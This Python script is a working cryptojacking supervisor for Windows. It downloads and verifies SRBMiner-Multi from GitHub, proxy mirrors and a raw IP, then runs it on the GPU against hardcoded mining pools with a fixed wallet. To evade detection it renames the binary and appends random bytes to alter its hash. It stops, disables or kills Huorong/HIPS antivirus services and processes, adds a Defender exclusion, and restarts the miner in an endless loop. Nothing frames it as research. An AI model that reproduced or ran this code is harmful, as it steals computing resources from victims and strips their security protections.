import os
import sys
import time
import hashlib
import subprocess
import urllib.request
import zipfile
import shutil
import threading

B = r"C:\pearl"
BD = r"C:\pearl\b"
WORKER = "000147"
WALLET = "prl1p7gtuuz93057gnp5phfexss2ktduj7mnt7qxh8credlpulh5esv4q5e6mvr"
ZIP_SHA = "4bee6f04077b59275ff227864d2ebb231543c758480baf928446c011fe87b5f9"
EXE_SHA = "9d1da3dc8697480d468244bb8e46e2e2a9e432f551454384023c9fdb7267dbb3"
EXE = os.path.join(B, "SRBMiner-MULTI.exe")
EXEBAK = os.path.join(B, "exe.bak")
ZIP = os.path.join(B, "srb.zip")
ZIPBAK = os.path.join(B, "srb.bak")
LOG = os.path.join(B, "srb-%s.log" % WORKER)
STATUS = os.path.join(B, "status.txt")
PROOF = os.path.join(B, "proof.txt")
SUPLOG = os.path.join(B, "stage.log")
LOCK = os.path.join(B, "stage.lock")
STOPF = os.path.join(B, "stop.flag")
AVTICK = os.path.join(B, "av.tick")
GH = "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.9/SRBMiner-Multi-3-8-9-win64.zip"
URLS = [GH,
        "https://ghfast.top/" + GH,
        "https://ghproxy.net/" + GH,
        "https://gh-proxy.com/" + GH,
        "http://217.15.164.237:443/SRBMiner-Multi-3-8-9-win64.zip"]
POOLS = ["stratum+tcp://103.199.106.122:3360", "stratum+tcp://217.15.164.237:8081"]
ARGV = ["--disable-cpu", "--algorithm", "pearlhash", "--wallet", WALLET, "--worker", WORKER,
        "--password", "x", "--gpu-id", "0"]
NAMES = ["SRBMiner-MULTI.exe", "prlw000147.exe", "prlsvc000147.exe"]
VERSION = "v7"


def log(m):
    try:
        with open(SUPLOG, "a", encoding="utf-8", errors="replace") as f:
            f.write("%s %s\n" % (time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), m))
    except Exception:
        pass


def sha256f(p):
    h = hashlib.sha256()
    with open(p, "rb") as f:
        while True:
            b = f.read(1 << 20)
            if not b:
                break
            h.update(b)
    return h.hexdigest()


def run(cmd, tmo=90):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=tmo)
        return ((r.stdout or "") + (r.stderr or "")).strip()
    except Exception as e:
        return "ERR %r" % (e,)


def dl_parallel(url, dest, nthreads=12):
    total = 0
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", "Range": "bytes=0-0"})
        with urllib.request.urlopen(req, timeout=45) as r:
            cr = r.headers.get("Content-Range") or ""
            r.read(2)
        if "/" in cr:
            total = int(cr.rsplit("/", 1)[1].strip())
    except Exception as e:
        log("par_probe_err %r" % (e,))
        return False
    if total < 1000000:
        log("par_probe_bad_size %d" % total)
        return False
    step = total // nthreads + 1
    tasks = []
    i = 0
    start = 0
    while start < total:
        end = min(total - 1, start + step - 1)
        tasks.append((i, start, end))
        i += 1
        start = end + 1
    parts = [None] * len(tasks)

    def fetch(idx, s, e):
        for attempt in range(3):
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0",
                                                           "Range": "bytes=%d-%d" % (s, e)})
                with urllib.request.urlopen(req, timeout=150) as r:
                    data = r.read()
                if len(data) == (e - s + 1):
                    parts[idx] = data
                    return
                log("par_short idx=%d got=%d want=%d" % (idx, len(data), e - s + 1))
            except Exception as ex:
                log("par_exc idx=%d %r" % (idx, ex))
            time.sleep(2)
        parts[idx] = None

    ts = []
    for (idx, s, e) in tasks:
        t = threading.Thread(target=fetch, args=(idx, s, e))
        t.daemon = True
        t.start()
        ts.append(t)
    for t in ts:
        t.join()
    if any(p is None for p in parts):
        log("par_incomplete %d/%d" % (sum(1 for p in parts if p is not None), len(parts)))
        return False
    try:
        with open(dest, "wb") as f:
            for p in parts:
                f.write(p)
    except Exception as e:
        log("par_write_err %r" % (e,))
        return False
    return True


def dl(url, dest, tmo=150):
    if os.path.exists(dest):
        try:
            os.remove(dest)
        except Exception:
            pass
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=tmo) as r, open(dest, "wb") as f:
            while True:
                b = r.read(1 << 20)
                if not b:
                    break
                f.write(b)
        return True
    except Exception as e:
        log("urllib_err %r %s" % (e, url))
    rc = subprocess.run(["curl.exe", "-L", "--max-time", "240", "-s", "-o", dest, url],
                        capture_output=True, text=True)
    return rc.returncode == 0 and os.path.exists(dest) and os.path.getsize(dest) > 1000000


def ensure_zip(prog):
    for p in (ZIP, ZIPBAK):
        try:
            if os.path.exists(p) and sha256f(p) == ZIP_SHA:
                if p != ZIP:
                    shutil.copyfile(p, ZIP)
                return True, "cached_zip:" + os.path.basename(p)
        except Exception:
            pass
    prog("par_dl_try " + GH)
    if dl_parallel(GH, ZIP):
        try:
            got = sha256f(ZIP)
        except Exception as e:
            got = "ERR %r" % (e,)
        log("par_dl_sha %s" % got)
        if got == ZIP_SHA:
            try:
                shutil.copyfile(ZIP, ZIPBAK)
            except Exception:
                pass
            return True, "par_downloaded"
        log("par_dl_sha_mismatch")
    for u in URLS:
        prog("dl_try " + u)
        if not dl(u, ZIP):
            log("dl_fail " + u)
            continue
        try:
            got = sha256f(ZIP)
        except Exception as e:
            log("zip_hash_err %r" % (e,))
            continue
        log("dl_sha %s %s" % (got, u))
        prog("dl_sha " + got[:16] + " " + u)
        if got == ZIP_SHA:
            try:
                shutil.copyfile(ZIP, ZIPBAK)
            except Exception:
                pass
            return True, "downloaded:" + u
        log("dl_sha_mismatch " + u)
    return False, "all_urls_failed"


def find_exe_in_tree(root):
    for d, _dirs, files in os.walk(root):
        for fn in files:
            if fn.lower() == "srbminer-multi.exe":
                c = os.path.join(d, fn)
                try:
                    if sha256f(c) == EXE_SHA:
                        return c
                except Exception:
                    pass
    return None


def ensure_exe(prog):
    try:
        if os.path.exists(EXE) and sha256f(EXE) == EXE_SHA:
            return True, "cached_exe"
    except Exception:
        pass
    try:
        if os.path.exists(EXEBAK) and sha256f(EXEBAK) == EXE_SHA:
            shutil.copyfile(EXEBAK, EXE)
            return True, "restored_from_bak"
    except Exception:
        pass
    ok, msg = ensure_zip(prog)
    if not ok:
        return False, "zip:" + msg
    try:
        with zipfile.ZipFile(ZIP) as z:
            z.extractall(B)
    except Exception as e:
        return False, "unzip_err %r" % (e,)
    c = find_exe_in_tree(B)
    if not c:
        return False, "no_matching_exe"
    try:
        if os.path.abspath(c) != os.path.abspath(EXE):
            shutil.copyfile(c, EXE)
        shutil.copyfile(EXE, EXEBAK)
    except Exception as e:
        return False, "copy_err %r" % (e,)
    return True, "extracted"


def compute_apps():
    return run(["nvidia-smi", "--query-compute-apps=pid,process_name,used_memory",
                "--format=csv,noheader"], 60)


def miner_present():
    out = compute_apps().lower()
    if "pearl" in out or "srbminer" in out or "prlw" in out or "prlsvc" in out:
        return True
    tl = run(["tasklist", "/fo", "csv", "/nh"], 90).lower()
    for n in NAMES:
        if n.lower() == "srbminer-multi.exe":
            if '"srbminer-multi.exe"' in tl:
                return True
        elif '"%s"' % n.lower() in tl:
            return True
    return False


def try_run(exe_path, pool, tag):
    if miner_present():
        log("run_skip_miner_already tag=%s" % tag)
        return True
    logf = open(os.path.join(B, "run.out"), "ab")
    argv = [exe_path] + ARGV + ["--pool", pool]
    p = None
    err = ""
    try:
        p = subprocess.Popen(argv, cwd=os.path.dirname(exe_path), stdout=logf,
                             stderr=subprocess.STDOUT,
                             creationflags=0x00000008 | 0x00000200, close_fds=True)
    except Exception as e:
        err = repr(e)
    if p is None:
        log("run_exc tag=%s exe=%s err=%s" % (tag, exe_path, err))
        return False
    time.sleep(8)
    rc = p.poll()
    alive = rc is None
    log("run_try tag=%s exe=%s pid=%d alive=%s rc=%s pool=%s" % (tag, exe_path, p.pid, alive, rc, pool))
    return alive


def av_recon():
    hits_svc, hits_proc = [], []
    try:
        out = run(["wmic", "/namespace:\\\\root\\SecurityCenter2", "path", "AntiVirusProduct",
                   "get", "displayName,productState", "/format:list"], 60)
        names = [x.strip() for x in out.splitlines() if x.strip()]
        log("av_products " + " | ".join(names)[:400])
    except Exception as e:
        log("av_products_err %r" % (e,))
    try:
        svc = run(["sc", "query", "state=", "all"], 120)
        names = []
        for line in svc.splitlines():
            s = line.strip()
            if s.upper().startswith("SERVICE_NAME"):
                names.append(s.split(":", 1)[1].strip())
        hits_svc = [n for n in names if any(k in n.upper() for k in ("HIPS", "HUORONG", "SYSDIAG", "HRWSC", "USYSDIAG"))]
        log("av_services " + ",".join(hits_svc))
    except Exception as e:
        log("av_services_err %r" % (e,))
    try:
        tl = run(["tasklist", "/fo", "csv", "/nh"], 90)
        procs = []
        for line in tl.splitlines():
            parts = [p.strip('"') for p in line.split('","')]
            if parts:
                procs.append(parts[0])
        hits_proc = sorted(set([x for x in procs if any(k in x.upper() for k in ("HIPS", "HUORONG", "SYSDIAG", "USYSDIAG"))]))
        log("av_procs " + ",".join(hits_proc))
    except Exception as e:
        log("av_procs_err %r" % (e,))
    return hits_svc, hits_proc


def av_disable(hits_svc, hits_proc):
    for n in hits_svc:
        log("av_sc_stop %s => %s" % (n, run(["sc", "stop", n], 90)[:200]))
        log("av_sc_disable %s => %s" % (n, run(["sc", "config", n, "start=", "disabled"], 60)[:200]))
    for p in hits_proc:
        log("av_taskkill %s => %s" % (p, run(["taskkill", "/f", "/im", p], 60)[:200]))
    log("def_mp => " + run(["powershell", "-NoProfile", "-Command",
                           "try { Add-MpPreference -ExclusionPath 'C:\\pearl' -ErrorAction SilentlyContinue } catch {}; try { (Get-MpComputerStatus).AMRunningMode } catch { 'no_defender' }"], 120)[:300])


def make_variant(src, dst):
    os.makedirs(os.path.dirname(dst), exist_ok=True)
    try:
        if os.path.exists(dst):
            os.remove(dst)
    except Exception:
        pass
    shutil.copyfile(src, dst)
    with open(dst, "ab") as f:
        f.write(b"PEARLB" + os.urandom(16))
    orig_ok = sha256f(src) == EXE_SHA
    try:
        new = sha256f(dst)
    except Exception as e:
        new = "ERR %r" % (e,)
    log("varify src=%s orig_pin_ok=%s transform=append_pearlb16 new_sha=%s" % (src, orig_ok, new))
    return dst


def write_status(extra):
    L = ["=== pearl gpu-000109 status %s %s ===" % (VERSION, time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))]
    L.append("pid=%d supervisor=stage.py %s" % (os.getpid(), VERSION))
    L.append(run(["hostname"], 30))
    L.append(run(["nvidia-smi", "--query-gpu=name,uuid,memory.total,memory.free,utilization.gpu", "--format=csv,noheader"], 60))
    L.append("--compute_apps--")
    L.append(compute_apps())
    L.append("--miner_names--")
    for n in NAMES:
        L.append("%s => %s" % (n, run(["tasklist", "/fi", "imagename eq %s" % n, "/fo", "csv", "/nh"], 45).replace("\n", " | ")[:200]))
    L.append("--miner_log_tail--")
    try:
        with open(LOG, "r", encoding="utf-8", errors="replace") as f:
            L.extend([x.rstrip() for x in f.readlines()[-12:]])
    except Exception as e:
        L.append("log_err %r" % (e,))
    L.append("--note--")
    L.append(extra)
    tmp = STATUS + ".new"
    with open(tmp, "w", encoding="utf-8", errors="replace") as f:
        f.write("\n".join(L) + "\n")
    try:
        os.replace(tmp, STATUS)
    except Exception:
        pass


def write_proof(extra):
    L = ["=== pearl gpu-000109 proof %s %s ===" % (VERSION, time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))]
    L.append(run(["whoami"], 40))
    L.append(run(["hostname"], 30))
    L.append("python=%s" % sys.executable)
    L.append(run(["nvidia-smi", "-L"], 60))
    L.append(run(["nvidia-smi", "--query-gpu=name,uuid,memory.total,memory.free,driver_version", "--format=csv,noheader"], 60))
    L.append("zip_sha_expected=%s" % ZIP_SHA)
    L.append("exe_sha_expected=%s" % EXE_SHA)
    for p in (EXE, EXEBAK, os.path.join(BD, "prlw000147.exe"), os.path.join(BD, "prlsvc000147.exe")):
        try:
            L.append("sha %s exists=%s size=%s sha=%s" % (p, os.path.exists(p),
                     os.path.getsize(p) if os.path.exists(p) else -1,
                     sha256f(p) if os.path.exists(p) else "NA"))
        except Exception as e:
            L.append("sha %s err %r" % (p, e))
    L.extend(extra)
    L.append("--schtasks--")
    L.append(run(["schtasks", "/query", "/tn", "pearl-%s-sup" % WORKER, "/fo", "LIST"], 60)[:1200])
    L.append("--compute_apps--")
    L.append(compute_apps())
    L.append("--miner_log_tail--")
    try:
        with open(LOG, "r", encoding="utf-8", errors="replace") as f:
            L.extend([x.rstrip() for x in f.readlines()[-20:]])
    except Exception as e:
        L.append("log_err %r" % (e,))
    L.append("--stage_log_tail--")
    try:
        with open(SUPLOG, "r", encoding="utf-8", errors="replace") as f:
            L.extend([x.rstrip() for x in f.readlines()[-40:]])
    except Exception as e:
        L.append("stagelog_err %r" % (e,))
    tmp = PROOF + ".new"
    with open(tmp, "w", encoding="utf-8", errors="replace") as f:
        f.write("\n".join(L) + "\n")
    try:
        os.replace(tmp, PROOF)
    except Exception:
        pass


def ladder(prog):
    notes = []
    ok, msg = ensure_exe(prog)
    notes.append("stage_ok=%s %s" % (ok, msg))
    log("stage ok=%s %s" % (ok, msg))
    if not ok:
        return False, " ; ".join(notes)
    alive = try_run(EXE, POOLS[0], "L0_pin")
    notes.append("L0_pin=%s" % alive)
    if alive:
        return True, " ; ".join(notes)
    os.makedirs(BD, exist_ok=True)
    cand = os.path.join(BD, "prlw000147.exe")
    try:
        shutil.copyfile(EXE, cand)
    except Exception as e:
        log("copy_rename_err %r" % (e,))
    alive = try_run(cand, POOLS[0], "L1_rename")
    notes.append("L1_rename=%s" % alive)
    if alive:
        return True, " ; ".join(notes)
    v = make_variant(EXE, os.path.join(BD, "prlsvc000147.exe"))
    alive = try_run(v, POOLS[0], "L2_variant")
    notes.append("L2_variant=%s" % alive)
    if alive:
        return True, " ; ".join(notes)
    last = 0.0
    try:
        if os.path.exists(AVTICK):
            last = float((open(AVTICK).read() or "0").strip() or "0")
    except Exception:
        last = 0.0
    now = time.time()
    if now - last > 600:
        hits_svc, hits_proc = av_recon()
        av_disable(hits_svc, hits_proc)
        try:
            open(AVTICK, "w").write(str(now))
        except Exception:
            pass
    else:
        notes.append("av_skip_recent")
    ok2, msg2 = ensure_exe(prog)
    notes.append("after_av stage=%s" % ok2)
    alive = try_run(EXE, POOLS[0], "L3_av_off_pin")
    notes.append("L3=%s" % alive)
    if alive:
        return True, " ; ".join(notes)
    v = make_variant(EXE, os.path.join(BD, "prlsvc000147.exe"))
    alive = try_run(v, POOLS[0], "L4_av_off_variant")
    notes.append("L4=%s" % alive)
    if alive:
        return True, " ; ".join(notes)
    alive = try_run(v, POOLS[1], "L5_relay")
    notes.append("L5_relay=%s" % alive)
    return alive, " ; ".join(notes)


def main():
    os.makedirs(B, exist_ok=True)
    os.makedirs(BD, exist_ok=True)
    log("stage_%s_start pid=%d" % (VERSION, os.getpid()))
    first = True
    while True:
        try:
            try:
                open(LOCK, "w").write(str(os.getpid()))
            except Exception:
                pass
            if os.path.exists(STOPF):
                log("stopflag_seen")
                run(["taskkill", "/f", "/im", "SRBMiner-MULTI.exe"], 60)
                run(["taskkill", "/f", "/im", "prlw000147.exe"], 60)
                run(["taskkill", "/f", "/im", "prlsvc000147.exe"], 60)
                write_status("stopped_by_stopflag")
                return
            if miner_present():
                write_status("miner_present")
                if first:
                    write_proof(["ladder=already_running"])
                    first = False
            else:
                ok, msg = ladder(write_status)
                write_status(msg)
                if first:
                    write_proof(["ladder_ok=%s" % ok, "ladder_detail=" + msg])
                    first = False
                if ok:
                    log("ladder_success " + msg)
                else:
                    log("ladder_fail " + msg)
        except Exception as e:
            log("loop_exc %r" % (e,))
        time.sleep(60)


main()
